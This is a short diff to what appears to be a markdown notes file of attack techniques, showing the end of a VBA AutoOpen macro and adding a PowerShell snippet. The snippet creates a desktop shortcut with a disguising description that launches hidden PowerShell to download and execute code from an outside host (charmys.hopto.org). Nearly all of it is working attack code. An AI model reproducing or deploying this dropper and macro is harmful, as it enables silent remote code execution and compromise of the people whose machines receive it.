@@ -921,3 +921,14 @@ Sub AutoOpen()
     MyObject.Run (FL)
 End Sub
 ```
+
+[Create Shortcut with Powershell]
+```
+$WshShell = New-Object -ComObject WScript.Shell
+$shortcut = $WshShell.CreateShortcut("C:\Users\REUSER\Desktop\aniqcomel.lnk")
+$shortcut.TargetPath = "powershell.exe"
+$shortcut.Description = "Totally Notmal"
+$shortcut.HotKey = "F6"
+$shortcut.Arguments = "-windowstyle hidden iex(iwr -usebasicparsing http://charmys.hopto.org:5269)"
+$shortcut.save()
+```
